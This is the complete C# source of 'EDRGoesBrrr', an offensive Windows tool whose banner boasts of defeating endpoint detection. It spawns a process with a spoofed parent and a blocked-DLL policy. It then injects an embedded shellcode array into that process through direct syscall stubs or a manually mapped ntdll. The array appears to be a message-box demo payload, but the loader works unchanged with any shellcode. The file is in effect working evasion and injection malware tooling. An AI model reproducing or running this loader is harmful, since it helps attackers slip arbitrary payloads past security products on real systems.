using DInvoke.DynamicInvoke;
using System;
using System.Diagnostics;
using System.Net;
using System.Runtime.InteropServices;
using NDesk.Options;


namespace EDRGoesBrrr
{
    class Program
    {
        static void PrintBanner()
        {
            Console.WriteLine(@"
            
  ______ _____  _____                       ____  _____  _____  _____  
 |  ____|  __ \|  __ \                     |  _ \|  __ \|  __ \|  __ \ 
 | |__  | |  | | |__) |__ _  ___   ___  ___| |_) | |__) | |__) | |__) |
 |  __| | |  | |  _  // _` |/ _ \ / _ \/ __|  _ <|  _  /|  _  /|  _  / 
 | |____| |__| | | \ \ (_| | (_) |  __/\__ \ |_) | | \ \| | \ \| | \ \ 
 |______|_____/|_|  \_\__, |\___/ \___||___/____/|_|  \_\_|  \_\_|  \_\
                       __/ |                                           
                      |___/                                            


Fucking up EDR's since 2021 - By jfmaes
");
        }

        public static byte[] buf = new byte[291] {
            0xfc,0x48,0x81,0xe4,0xf0,0xff,0xff,0xff,0xe8,0xd0,0x00,0x00,0x00,0x41,0x51,
            0x41,0x50,0x52,0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x3e,0x48,
            0x8b,0x52,0x18,0x3e,0x48,0x8b,0x52,0x20,0x3e,0x48,0x8b,0x72,0x50,0x3e,0x48,
            0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,
            0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x3e,
            0x48,0x8b,0x52,0x20,0x3e,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x3e,0x8b,0x80,0x88,
            0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x6f,0x48,0x01,0xd0,0x50,0x3e,0x8b,0x48,
            0x18,0x3e,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,0x5c,0x48,0xff,0xc9,0x3e,
            0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,
            0xc1,0xc9,0x0d,0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x3e,0x4c,0x03,0x4c,0x24,
            0x08,0x45,0x39,0xd1,0x75,0xd6,0x58,0x3e,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,
            0x66,0x3e,0x41,0x8b,0x0c,0x48,0x3e,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x3e,
            0x41,0x8b,0x04,0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,
            0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,
            0x59,0x5a,0x3e,0x48,0x8b,0x12,0xe9,0x49,0xff,0xff,0xff,0x5d,0x49,0xc7,0xc1,
            0x00,0x00,0x00,0x00,0x3e,0x48,0x8d,0x95,0xfe,0x00,0x00,0x00,0x3e,0x4c,0x8d,
            0x85,0x0b,0x01,0x00,0x00,0x48,0x31,0xc9,0x41,0xba,0x45,0x83,0x56,0x07,0xff,
            0xd5,0x48,0x31,0xc9,0x41,0xba,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x45,0x56,0x49,
            0x4c,0x20,0x50,0x41,0x59,0x4c,0x4f,0x41,0x44,0x00,0x4d,0x65,0x73,0x73,0x61,
            0x67,0x65,0x42,0x6f,0x78,0x00 };

        static IntPtr SpawnMSStoreOnlySacrificialProcess(string ProcessToSpawn, string parentProcess)
        {
            IntPtr procHandle = IntPtr.Zero;
            var si = new STARTUPINFOEX();
            si.StartupInfo.cb = (uint)Marshal.SizeOf(si);
            //si.StartupInfo.dwFlags = 0x00000001;
            var lpValue = Marshal.AllocHGlobal(IntPtr.Size);
            try
            {
                var funcParams = new object[] {
                    IntPtr.Zero,
                    2,
                    0,
                    IntPtr.Zero
                };

                Generic.DynamicAPIInvoke(
                    "kernel32.dll",
                    "InitializeProcThreadAttributeList",
                    typeof(StructsAndDelegates.InitializeProcThreadAttributeList),
                    ref funcParams,
                    true);

                var lpSize = (IntPtr)funcParams[3];
                si.lpAttributeList = Marshal.AllocHGlobal(lpSize);

                funcParams[0] = si.lpAttributeList;

                Generic.DynamicAPIInvoke(
                    "kernel32.dll",
                    "InitializeProcThreadAttributeList",
                    typeof(StructsAndDelegates.InitializeProcThreadAttributeList),
                    ref funcParams,
                    true);

                // BlockDLLs
                Marshal.WriteIntPtr(lpValue, new IntPtr((long)BinarySignaturePolicy.BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON));
                funcParams = new object[]
                {
                    si.lpAttributeList,
                    (uint)0,
                    (IntPtr)ProcThreadAttribute.MITIGATION_POLICY,
                    lpValue,
                    (IntPtr)IntPtr.Size,
                    IntPtr.Zero,
                    IntPtr.Zero
                };

                Generic.DynamicAPIInvoke(
                    "kernel32.dll",
                    "UpdateProcThreadAttribute",
                    typeof(StructsAndDelegates.UpdateProcThreadAttribute),
                    ref funcParams,
                    true);

                // PPID Spoof
                var hParent = Process.GetProcessesByName(parentProcess)[0].Handle;
                if (hParent != IntPtr.Zero)
                {
                    lpValue = Marshal.AllocHGlobal(IntPtr.Size);
                    Marshal.WriteIntPtr(lpValue, hParent);


                    // Start Process
                    funcParams = new object[]
                    {
                        si.lpAttributeList,
                        (uint) 0,
                        (IntPtr) ProcThreadAttribute.PARENT_PROCESS,
                        lpValue,
                        (IntPtr) IntPtr.Size,
                        IntPtr.Zero,
                        IntPtr.Zero
                    };

                    Generic.DynamicAPIInvoke(
                        "kernel32.dll",
                        "UpdateProcThreadAttribute",
                        typeof(StructsAndDelegates.UpdateProcThreadAttribute),
                        ref funcParams,
                        true);
                }

                var pa = new SECURITY_ATTRIBUTES();
                var ta = new SECURITY_ATTRIBUTES();
                pa.nLength = Marshal.SizeOf(pa);
                ta.nLength = Marshal.SizeOf(ta);

                funcParams = new object[]
                {
                    null,
                    ProcessToSpawn,
                    pa,
                    ta,
                    false,
                    CreationFlags.EXTENDED_STARTUPINFO_PRESENT,
                    IntPtr.Zero,
                    null,
                    si,
                    null
                };

                Generic.DynamicAPIInvoke(
                    "kernel32.dll",
                    "CreateProcessA",
                    typeof(StructsAndDelegates.CreateProcess),
                    ref funcParams,
                    true);

                var pi = (PROCESS_INFORMATION)funcParams[9];

                if (pi.hProcess != IntPtr.Zero)
                {
                    Console.WriteLine($"Process ID: {pi.dwProcessId}");
                }
                return pi.hProcess;
            }
            catch (Exception e)
            {
                Console.Error.WriteLine(e.Message);
                return procHandle;
            }
            finally
            {
                // Clean up
                var funcParams = new object[]
                {
                    si.lpAttributeList
                };

                Generic.DynamicAPIInvoke(
                    "kernel32.dll",
                    "DeleteProcThreadAttributeList",
                    typeof(StructsAndDelegates.DeleteProcThreadAttributeList),
                    ref funcParams,
                    true);

                Marshal.FreeHGlobal(si.lpAttributeList);
                Marshal.FreeHGlobal(lpValue);
            }

        }

        static void InjectIntoProcess(IntPtr processHandle, byte[] blob)
        {
            uint status = 1;
            IntPtr pHandle = processHandle;
            IntPtr syscall = IntPtr.Zero;
            IntPtr memAlloc = IntPtr.Zero;
            IntPtr zeroBits = IntPtr.Zero;
            IntPtr size = (IntPtr)blob.Length;
            IntPtr pThread = IntPtr.Zero;
            IntPtr buffer = Marshal.AllocHGlobal(blob.Length);
            uint bytesWritten = 0;
            uint oldProtect = 0;
            Marshal.Copy(blob, 0, buffer, blob.Length);
            syscall = Generic.GetSyscallStub("NtAllocateVirtualMemory");
            Native.DELEGATES.NtAllocateVirtualMemory syscallAllocateVirtualMemory = (Native.DELEGATES.NtAllocateVirtualMemory)Marshal.GetDelegateForFunctionPointer(syscall, typeof(Native.DELEGATES.NtAllocateVirtualMemory));
            Console.WriteLine("Hit a key to alloc memory");
            Console.ReadKey();
            status = syscallAllocateVirtualMemory(pHandle, ref memAlloc, zeroBits, ref size, DInvoke.Data.Win32.Kernel32.MEM_COMMIT | DInvoke.Data.Win32.Kernel32.MEM_RESERVE, 0x04);
            //Console.WriteLine(String.Format("0x{0:X4}", memAlloc));
            Console.WriteLine("Hit a key to write memory");
            Console.ReadKey();
            syscall = Generic.GetSyscallStub("NtWriteVirtualMemory");
            Native.DELEGATES.NtWriteVirtualMemory syscallWriteVirtualMemory = (Native.DELEGATES.NtWriteVirtualMemory)Marshal.GetDelegateForFunctionPointer(syscall, typeof(Native.DELEGATES.NtWriteVirtualMemory));
            status = syscallWriteVirtualMemory(pHandle, memAlloc, buffer, (uint)blob.Length, ref bytesWritten);
            syscall = Generic.GetSyscallStub("NtProtectVirtualMemory");
            Native.DELEGATES.NtProtectVirtualMemory syscallProtectVirtualMemory = (Native.DELEGATES.NtProtectVirtualMemory)Marshal.GetDelegateForFunctionPointer(syscall, typeof(Native.DELEGATES.NtProtectVirtualMemory));
            status = syscallProtectVirtualMemory(pHandle, ref memAlloc, ref size, 0x20, ref oldProtect);
            Console.WriteLine("Hit a key to create the thread and launch our shellcode!");
            Console.ReadKey();
            syscall = Generic.GetSyscallStub("NtCreateThreadEx");
            Native.DELEGATES.NtCreateThreadEx syscallNtCreateThreadEx = (Native.DELEGATES.NtCreateThreadEx)Marshal.GetDelegateForFunctionPointer(syscall, typeof(Native.DELEGATES.NtCreateThreadEx));
            pThread = IntPtr.Zero;
            status = (uint)syscallNtCreateThreadEx(out pThread, DInvoke.Data.Win32.WinNT.ACCESS_MASK.MAXIMUM_ALLOWED, IntPtr.Zero, pHandle, memAlloc, IntPtr.Zero, false, 0, 0, 0, IntPtr.Zero);
        }

        static void InjectIntoProcessManualMapping(IntPtr processHandle, byte[] blob)
        {
            uint status = 1;
            IntPtr pHandle = processHandle;
            IntPtr memAlloc = IntPtr.Zero;
            IntPtr zeroBits = IntPtr.Zero;
            IntPtr size = (IntPtr)blob.Length;
            IntPtr pThread = IntPtr.Zero;
            IntPtr buffer = Marshal.AllocHGlobal(blob.Length);
            uint bytesWritten = 0;
            uint oldProtect = 0;
            Marshal.Copy(blob, 0, buffer, blob.Length);

            DInvoke.Data.PE.PE_MANUAL_MAP mappedDLL = new DInvoke.Data.PE.PE_MANUAL_MAP();
            mappedDLL = DInvoke.ManualMap.Map.MapModuleToMemory(@"C:\Windows\System32\ntdll.dll");
            Console.WriteLine(String.Format("Please check the memory of this process in process hacker under the address: 0x{0:x} to find the manually mapped ntdll.dll", mappedDLL.ModuleBase.ToInt64()));

            Console.WriteLine("Hit a key to alloc memory");
            Console.ReadKey();
            object[] allocateVirtualMemoryParams = { pHandle, memAlloc, zeroBits, size, DInvoke.Data.Win32.Kernel32.MEM_COMMIT | DInvoke.Data.Win32.Kernel32.MEM_RESERVE, (uint)0x04 };
            status = (uint)DInvoke.DynamicInvoke.Generic.CallMappedDLLModuleExport(mappedDLL.PEINFO, mappedDLL.ModuleBase, "NtAllocateVirtualMemory", typeof(Native.DELEGATES.NtAllocateVirtualMemory), allocateVirtualMemoryParams, false);
            memAlloc = (IntPtr)allocateVirtualMemoryParams[1];
            size = (IntPtr)allocateVirtualMemoryParams[3];

            Console.WriteLine("Hit a key to write memory");
            Console.ReadKey();
            object[] writeVirtualMemoryParams = { pHandle, memAlloc, buffer, (uint)blob.Length, bytesWritten };
            status = (uint)DInvoke.DynamicInvoke.Generic.CallMappedDLLModuleExport(mappedDLL.PEINFO, mappedDLL.ModuleBase, "NtWriteVirtualMemory", typeof(Native.DELEGATES.NtWriteVirtualMemory), writeVirtualMemoryParams, false);
            bytesWritten = (uint)writeVirtualMemoryParams[4];

            object[] protectVirtualMemoryParams = { pHandle, memAlloc, size, (uint)0x20, oldProtect };
            status = (uint)DInvoke.DynamicInvoke.Generic.CallMappedDLLModuleExport(mappedDLL.PEINFO, mappedDLL.ModuleBase, "NtProtectVirtualMemory", typeof(Native.DELEGATES.NtProtectVirtualMemory), protectVirtualMemoryParams, false);
            memAlloc = (IntPtr)protectVirtualMemoryParams[1];
            size = (IntPtr)protectVirtualMemoryParams[2];
            oldProtect = (uint)protectVirtualMemoryParams[4];

            Console.WriteLine("Hit a key to create the thread and launch our shellcode!");
            Console.ReadKey();
            object[] createThreadParams = { pThread, DInvoke.Data.Win32.WinNT.ACCESS_MASK.MAXIMUM_ALLOWED, IntPtr.Zero, pHandle, memAlloc, IntPtr.Zero, false, 0, 0, 0, IntPtr.Zero };
            status = (uint)DInvoke.DynamicInvoke.Generic.CallMappedDLLModuleExport(mappedDLL.PEINFO, mappedDLL.ModuleBase, "NtCreateThreadEx", typeof(Native.DELEGATES.NtCreateThreadEx), createThreadParams, false);
            pThread = (IntPtr)createThreadParams[0];
        }

        public static void ShowHelp(OptionSet p)
        {
            Console.WriteLine("Usage:");
            p.WriteOptionDescriptions(Console.Out);
        }


        static void Main(string[] args)
        {
            bool help = false;
            bool sysCalls = false;
            bool manualMap = false;
            string parentprocess = "";
            string processtospawn = "";

            var options = new OptionSet()
            {
                {"h|help", "show this menu", o => help = true},
                {"p|parent=", "the parent process to spoof", o => parentprocess = o },
                {"s|spawn=", "the process to spawn", o => processtospawn = o},
                {"sc|syscalls","use syscalls to inject", o => sysCalls= true },
                {"mm|manual-map","use manualmapping to inject", o => manualMap = true }
            };

            try
            {
                PrintBanner();
                options.Parse(args);
                if (help)
                {
                    ShowHelp(options);
                    return;
                }

                Console.WriteLine("Spawning {0} with parent process {1}", processtospawn, parentprocess);
                IntPtr procHandle = SpawnMSStoreOnlySacrificialProcess(processtospawn, parentprocess);
                if (manualMap)
                {
                    InjectIntoProcessManualMapping(procHandle, buf);
                }
                else
                {
                    InjectIntoProcess(procHandle, buf);
                }
                Console.WriteLine("Injecting...");
            }
            catch (Exception e)
            {
                Console.WriteLine(e);
            }
        }
    }
}
